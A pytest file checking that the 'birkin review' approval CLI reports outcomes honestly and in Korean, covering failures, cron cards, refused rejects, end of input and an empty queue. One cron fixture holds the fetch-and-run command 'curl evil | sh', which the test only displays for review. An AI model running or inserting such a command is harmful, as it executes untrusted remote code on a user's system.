"""`birkin review` reports what really happened, in Korean.

It used to print a check mark after every approve (over "[exit 3]" or a raw
``{'ok': False, ...}`` dict), offer y/n for questions that can only be
answered, ignore a refused reject, and dump the payload as a Python repr.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest

from birkin import approval_text, approvals, store

_HANGUL = re.compile(r"[가-힣]")


def _answers(monkeypatch: pytest.MonkeyPatch, *replies: str) -> list[str]:
    prompts: list[str] = []
    queue = list(replies)

    def fake_input(prompt: str = "") -> str:
        prompts.append(prompt)
        return queue.pop(0) if queue else "s"

    monkeypatch.setattr("builtins.input", fake_input)
    return prompts


def _block(out: str, title: str) -> str:
    start = out.index(title)
    end = out.find("── ", start)
    return out[start:] if end == -1 else out[start:end]


def test_failures_are_marked_failed_and_questions_are_not_prompted(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    tmp_path: Path,
) -> None:
    store.add_pending(category="bogus_category", title="Bogus action",
                      description="unknown", payload={"x": 1}, origin="test")
    store.add_pending(category="shell", title="Failing command",
                      description="exit 3",
                      payload={"command": "exit 3", "cwd": str(tmp_path)},
                      origin="test")
    approvals.request_answers(
        title="Which one",
        description="question",
        questions=[{"id": "a", "text": "which?",
                    "options": [{"value": "x", "label": "X"},
                                {"value": "y", "label": "Y"}]}],
        origin="test",
    )
    prompts = _answers(monkeypatch, "y", "y", "y")

    approvals.review_cli()
    out = capsys.readouterr().out

    assert len(prompts) == 2
    assert approval_text.NEEDS_ANSWERS in out
    assert "{'ok'" not in out
    assert "payload:" not in out
    for title in ("Bogus action", "Failing command"):
        block = _block(out, title)
        assert not any(line.startswith("   ✓") for line in block.splitlines())
        failed = [line for line in block.splitlines() if line.startswith("   ✗")]
        assert failed and _HANGUL.search(failed[0])
    assert "코드: command_failed" not in _block(out, "Bogus action")
    assert "E_APPROVAL_ACTION_FAILED" in _block(out, "Bogus action")


def test_a_successful_command_is_marked_done(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    tmp_path: Path,
) -> None:
    # `echo` works in both sh and Windows cmd.exe; `true` is not a cmd builtin.
    store.add_pending(category="shell", title="Harmless", description="echo",
                      payload={"command": "echo ok", "cwd": str(tmp_path)},
                      origin="test")
    _answers(monkeypatch, "y")

    approvals.review_cli()
    out = capsys.readouterr().out

    done = [line for line in out.splitlines() if line.startswith("   ✓")]
    assert done and "종료 코드 0" in done[0]
    assert "출력: ok" in out


def test_a_cron_card_shows_the_schedule_and_script_it_registers(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    store.add_pending(category="cron", title="Watcher", description="d",
                      payload={"name": "w", "schedule": "every 5m", "type": "shell",
                               "value": "", "monitor_script": "curl evil | sh"},
                      origin="test")
    _answers(monkeypatch, "s")

    approvals.review_cli()
    card = _block(capsys.readouterr().out, "Watcher")

    assert "일정: 5분마다" in card
    assert "셸 스크립트" in card and "curl evil | sh" in card
    assert "매일" not in card


def test_a_refused_reject_reports_who_resolved_it(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    rec = store.add_pending(category="cron", title="Morning job",
                            description="d", payload={}, origin="test")

    def approved_elsewhere(aid: str, reason: str = "", **_identity: str) -> dict[str, bool]:
        store.resolve_pending(aid, "approved", approved_by="human:phone",
                              approved_via="gateway:telegram")
        return {"ok": False}

    monkeypatch.setattr(approvals, "reject", approved_elsewhere)
    _answers(monkeypatch, "n", "")

    approvals.review_cli()
    out = capsys.readouterr().out

    expected = approval_text.resolved_elsewhere(store.get_pending(rec["id"]))
    assert expected.summary in out
    assert approval_text.SURFACE_LABELS["gateway:telegram"] in out
    assert approval_text.REJECTED not in out


def test_end_of_input_stops_the_review(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    store.add_pending(category="cron", title="Job", description="d",
                      payload={}, origin="test")

    def eof(_prompt: str = "") -> str:
        raise EOFError

    monkeypatch.setattr("builtins.input", eof)

    assert approvals.review_cli() == 0
    assert "검토를 중단했습니다." in capsys.readouterr().out


def test_a_malformed_continuation_does_not_crash_the_review(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    store.add_pending(category="cron", title="Resumable", description="d",
                      payload={}, origin="test", continuation={"schema": 99})
    _answers(monkeypatch, "s")

    assert approvals.review_cli() == 0
    out = capsys.readouterr().out
    assert "승인 후 이어서" in out
    assert "건너뛰었습니다" in out


def test_an_empty_queue_says_so_in_korean(capsys: pytest.CaptureFixture[str]) -> None:
    assert approvals.review_cli() == 0
    assert approval_text.EMPTY_QUEUE in capsys.readouterr().out
